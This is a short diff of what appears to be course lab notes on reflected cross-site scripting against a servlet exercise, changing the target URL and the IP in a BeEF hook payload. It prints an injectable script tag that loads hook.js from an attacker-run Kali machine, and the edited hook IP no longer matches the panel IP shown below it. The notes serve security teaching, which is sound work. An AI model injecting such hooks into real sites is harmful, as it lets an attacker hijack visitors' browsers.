@@ -1,7 +1,7 @@
 Reflected Cross-Site Scripting
 ---------------------------------------------------------------------
 
-URL: http://localhost:8080/Servlet-XSS-Exercise/index.html
+URL: http://lab.se.org:8080/Servlet-XSS-Exercise/index.html
 		 
 
 How to attack an input field?
@@ -53,7 +53,7 @@ How to hook into the BeEF framework?
 o) Start the BeEF server (using a Kali VM) -> ifconfig -> 10.0.2.15
 
 o) Inject the following JavaScript code:
-    <script src="http://10.0.2.15:3000/hook.js"></script>
+    <script src="http://10.0.2.4:3000/hook.js"></script>
 
 o) Open the BeEF Panel in a browser:
     http://10.0.2.15:3000/ui/panel
